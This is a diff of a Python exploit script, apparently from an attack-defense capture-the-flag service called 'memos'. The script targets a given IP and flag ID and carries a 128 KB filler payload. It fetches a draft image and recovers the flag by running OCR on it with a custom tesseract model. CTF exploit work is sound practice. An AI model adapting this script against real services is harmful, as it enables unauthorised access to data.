@@ -1,13 +1,15 @@
 #!/usr/bin/env python3.11
 
 import os
+import io
 import sys
 import time
 import socket
 import secrets
-import requests
+import subprocess
 
-import pytesseract
+import requests
+from PIL import Image
 
 
 IP = sys.argv[1] if len(sys.argv) > 1 else '0.0.0.0'
@@ -17,6 +19,36 @@ FLAG_ID = sys.argv[2] if len(sys.argv) > 2 else 'aaaaaaaa-bbbb-cccc-dddd-eeeeeee
 
 EMPTY_JPEG = bytes.fromhex('ffd8ffe000104a46494600010100000000000000ffdb004300030202020202030202020303030304060404040404080606050609080a0a090809090a0c0f0c0a0b0e0b09090d110d0e0f101011100a0c12131210130f101010ffc0000b080001000101011100ffc40014000100000000000000000000000000000009ffc40014100100000000000000000000000000000000ffda0008010100003f0054dfffd9')
 PAYLOAD_TEXT = 'regular|#abcdef|1|2|3|' + 'A' * 128 * 1024
+
+
+def recognize_text(image: bytes) -> str:
+    filename = secrets.token_hex(8) + '.jpg'
+
+    buffer = io.BytesIO(image)
+    img = Image.open(buffer)
+
+    img = img.convert('L')
+    img = img.point( lambda p: 255 if p > 128 else 0 )
+    img = img.convert('1')
+
+    img.save(filename, 'jpeg')
+
+    process = subprocess.Popen(
+        [
+            'tesseract',
+            '--tessdata-dir', '../../checkers/memos/',
+            '-l', 'final',
+            filename,
+            'stdout',
+        ],
+        stdout = subprocess.PIPE,
+    )
+
+    content, _ = process.communicate()
+
+    os.unlink(filename)
+
+    return content.decode()
 
 
 def main():
@@ -62,17 +94,17 @@ def main():
 
     with requests.session() as session:
         response = session.get(f'http://{IP}:{PORT}/drafts/view/{draft_uuid}')
-        flag_image = response.content
+        image = response.content
 
-    filename = secrets.token_hex(8) + '.jpg'
+    recognized_flag = recognize_text(image)
+    recognized_flag = recognized_flag.replace(' ', '').replace('\n', '')
 
-    with open(filename, 'wb') as file:
-        file.write(flag_image)
+    recognized_flag = ''.join(
+        x for x in recognized_flag if x == '0' or x == '1'
+    )
 
-    flag = pytesseract.image_to_string(filename)
+    flag = int(recognized_flag, 2).to_bytes(32, 'big')
     print(flag)
-
-    os.unlink(filename)
 
 
 if __name__ == '__main__':
